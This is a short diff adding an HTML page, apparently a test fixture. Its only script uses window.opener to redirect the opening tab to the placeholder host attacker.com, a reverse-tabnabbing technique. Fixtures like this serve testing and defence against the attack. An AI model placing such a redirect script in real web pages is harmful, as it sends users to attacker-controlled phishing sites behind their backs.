@@ -1,0 +1,8 @@
+<html>
+  <script>
+    if (window.opener && !window.opener.closed) {
+      window.opener.location = "http://attacker.com";
+    }
+  </script>
+  Blah
+</html>
